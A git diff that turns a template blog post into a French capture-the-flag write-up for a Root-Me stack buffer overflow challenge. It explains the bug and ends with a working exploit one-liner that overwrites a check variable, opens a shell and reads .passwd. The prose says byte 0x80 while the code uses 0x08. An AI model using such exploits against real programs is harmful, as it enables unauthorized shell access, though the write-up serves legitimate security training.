@@ -1,28 +1,47 @@
 ---
-title: "Using MDX"
-description: "Lorem ipsum dolor sit amet"
-pubDate: "Jul 02 2022"
+title: "ELF x86 - Stack buffer overflow basic 3"
+description: "Write up medium challenge "
+pubDate: "May 12 2024"
 image: /image/image4.jpg
 categories:
-  - tech
+  - rootme
+tags:
+  - app-system
+  - buffer-overflow
 badge: Pin
 ---
 
-This theme comes with the [@astrojs/mdx](https://docs.astro.build/en/guides/integrations-guide/mdx/) integration installed and configured in your `astro.config.mjs` config file. If you prefer not to use MDX, you can disable support by removing the integration from your config file.
+Le but de ce challenge est que check soit égale à 0xbffffabc afin d'ouvrir un shell.
+'''c
+if(check == 0xbffffabc)
+        shell();
+'''
+Je ne risque pas de provoquer un débordement de buffer, car dès que count atteint 64, nous entrons dans une boucle infinie avec des messages "Oh no... Sorry !".\\
+Cependant, il est remarquable qu'il est possible de décrémenter count en fournissant au programme un octet 0x80
+'''c
+ case 0x08:
+  count--;
+  printf("\b");
+  break;
+'''
+De plus, dans le case default, la valeur de i est affectée à buffer[count]:
+'''c
+ default:
+  buffer[count] = i;
+  count++;
+  break;
+'''
+Il est facile de voir la vulnérabilité : si nous parvenons à décrémenter count suffisamment pour que buffer[count] pointe sur check, nous pourrions écrire 0xbffffabc et ainsi prendre le contrôle du shell.\\
+Comme la variable check est juste en dessous de buffer, en ajoutant 4 fois 0x80 (4 fois car sizeof(int) = 4), nous pourrions pointer sur check.
 
-## Why MDX?
-
-MDX is a special flavor of Markdown that supports embedded JavaScript & JSX syntax. This unlocks the ability to [mix JavaScript and UI Components into your Markdown content](https://docs.astro.build/en/guides/markdown-content/#mdx-features) for things like interactive charts or alerts.
-
-If you have existing content authored in MDX, this integration will hopefully make migrating to Astro a breeze.
-
-## Example
-
-Here is how you import and use a UI component inside of MDX.  
-When you open this page in the browser, you should see the clickable button below.
-
-## More Links
-
-- [MDX Syntax Documentation](https://mdxjs.com/docs/what-is-mdx)
-- [Astro Usage Documentation](https://docs.astro.build/en/guides/markdown-content/#markdown-and-mdx-pages)
-- **Note:** [Client Directives](https://docs.astro.build/en/reference/directives-reference/#client-directives) are still required to create interactive components. Otherwise, all components in your MDX will render as static HTML (no JavaScript) by default.
+'''c
+char buffer[64];
+  int check;
+  int i = 0;
+  int count = 0;
+'''
+Je peux donc utiliser la commande ci-dessous pour décrémenter count 4 fois et écrire la séquence d'octets nécessaire pour passer la condition de check, en n'oubliant pas de terminer par ;cat pour maintenir le shell ouvert.
+'''python
+  $ (python -c 'print"\x08"*4+"\xbc\xfa\xff\xbf"';cat)|./ch16
+'''
+Ainsi, je peux afficher le contenu de .passwd et récupérer le flag.
